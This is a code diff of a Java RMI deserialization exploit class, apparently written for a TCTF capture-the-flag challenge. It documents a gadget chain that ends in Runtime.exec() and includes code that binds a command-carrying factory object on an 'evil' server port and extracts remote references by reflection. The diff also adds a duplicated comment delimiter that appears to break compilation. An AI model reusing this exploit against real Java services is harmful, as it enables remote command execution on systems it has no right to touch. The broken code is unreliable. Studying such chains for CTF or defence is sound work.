@@ -23,6 +23,7 @@ import java.rmi.server.UnicastRemoteObject;
 
 
 /*
+/*
 	Gadget chain:
 		Gadget.readObject()
 		    UserInter(Proxy).getGirlFriend()
@@ -31,19 +32,20 @@ import java.rmi.server.UnicastRemoteObject;
                         StreamRemoteCall#executeCall()
                             UserInter.getGirlFriend()
                         Templates(Proxy).newTransformer()
-                    MyInvocationHandler.invoke()
+                     MyInvocationHandler.invoke()
                         FactoryInter(Proxy).getObject()
                             RemoteObjectInvocationHandler.invoke()
                                 UnicastRef.invoke()
                                     StreamRemoteCall#executeCall()
                                         FactoryInter.getObject()
-						Method.invoke()
-							TemplatesImpl.newTransformer()
-								TemplatesImpl.getTransletInstance()
-									TemplatesImpl.defineTransletClasses()
-										TemplatesImpl.TransletClassLoader.defineClass()
-											Pwner*(Javassist-generated).<static init>
-												Runtime.exec()
+			 Method.invoke()
+                            TemplatesImpl.newTransformer()
+                                TemplatesImpl.getTransletInstance()
+                                    TemplatesImpl.defineTransletClasses()
+                                        TemplatesImpl.TransletClassLoader.defineClass()
+                                            Pwner*(Javassist-generated).<static init>
+                                                Runtime.exec()
+ */
  */
 class UserImpl implements UserInter {
     Registry registry;
@@ -102,7 +104,9 @@ public class TCTF3rmiExp extends PayloadRunner implements ObjectPayload<Object> 
         FactoryImpl factoryImpl = new FactoryImpl();
         Reflections.setFieldValue(factoryImpl,"cmd",command);
         registry.bind("factory", UnicastRemoteObject.exportObject(factoryImpl, evilServerPort));
+//        ((UnicastRef) ((RemoteObjectInvocationHandler) ref).ref).getLiveRef().getEndpoint().getClass()
         InvocationHandler ref = Proxy.getInvocationHandler(registry.lookup("UserImpl"));
+
         Field field =  ref.getClass().getSuperclass().getDeclaredField("ref");
         field.setAccessible(true);
         UnicastRef unicastRef =  (UnicastRef)field.get(ref);
